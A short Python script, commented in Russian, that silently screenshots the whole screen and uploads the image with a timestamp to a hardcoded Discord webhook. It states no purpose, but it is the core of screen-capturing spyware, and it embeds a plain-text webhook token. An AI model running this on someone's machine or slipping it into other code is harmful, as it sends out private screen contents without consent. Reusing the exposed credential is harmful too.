import pyautogui
import datetime
from io import BytesIO
from discord_webhook import DiscordWebhook

# Сделать скриншот и сохранить в память
screenshot_bytes = BytesIO()
pyautogui.screenshot().save(screenshot_bytes, format='PNG')
screenshot_bytes.seek(0)  # вернуться в начало потока

# Дата и время
now = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
description = f"Скриншот сделан: {now}"

# Отправка в Discord
webhook = DiscordWebhook(
    url="https://discord.com/api/webhooks/1392514465240580195/KYzEZHcGEwSmJyLlxuP9STfaKh2yVUmM4OCzBMamn2-RQZ2rYQgIO69IbDUopA7nb1UG",
    username="Калл",
    content=description
)

# Прикрепляем скриншот (из памяти)
webhook.add_file(file=screenshot_bytes.read(), filename="screenshot.png")

response = webhook.execute()
